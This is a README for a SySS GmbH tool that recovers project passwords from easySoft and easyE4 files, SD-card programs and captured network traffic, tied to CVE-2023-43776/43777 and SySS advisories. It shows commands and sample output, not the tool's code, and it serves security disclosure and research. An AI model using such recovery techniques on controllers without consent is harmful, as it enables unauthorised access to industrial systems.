Password recovery easySoft and easyE4 (CVE-2023-43776 and CVE-2023-43777)
====

This script can extract the project password from an easySoft project file as well as calculating password candidates for easyE4 programs stored on an SD card.
In addition, password candidates can also be extracted from a network stream which was recorded during administration, for example.

You can find further details about those security issues in our SySS security advisories SYSS-2023-007, SYSS-2023-008, SYSS-2023-009 and SYSS-2023-010.

Usage
-----

Retrieving the password from a project file:
```
> easy_password_recovery.py PRJ syss_prj_pw_123456.e80
easy/easySoft password recovery tool
     by Manuel Stotz, SySS GmbH

[*] Start password recovery

[*] Found password 123456

[*] Bye!
```

Calculating password candidates for an easyE4 program stored on an SD card:
```
> easy_password_recovery.py SDC syss_prg_pw_222222.prg
easy/easySoft password recovery tool
     by Manuel Stotz, SySS GmbH

[*] Start password recovery

[*] Found password candidate for encoded password 9fd0204: 222222
[*] Found password candidate for encoded password 9fd0204: Q628AW
[*] Found password candidate for encoded password 9fd0204: R0ZUS6

[*] Bye!
```

Calculating password candidates from a network stream intercepted during administration:
```
> easy_password_recovery.py PCAP syss_network_pw_111111.pcapng
easy/easySoft password recovery tool
     by Manuel Stotz, SySS GmbH

[*] Start password recovery

[*] Found password candidate for encoded password 0x7022c848040ac202/0xe22483f6: 111111
[*] Found password candidate for encoded password 0x7022c848040ac202/0xe22483f6: Q3YVP5
[*] Found password candidate for encoded password 0x7022c848040ac202/0xe22483f6: ZCAAQS

[*] Bye!
```

Requirements
------------

* `python 3.x`
* `pyshark`

Author
----------

Manuel Stotz (SySS GmbH).

Disclaimer
----------

Use at your own risk. Do not use without full consent of everyone involved.
For educational purposes only.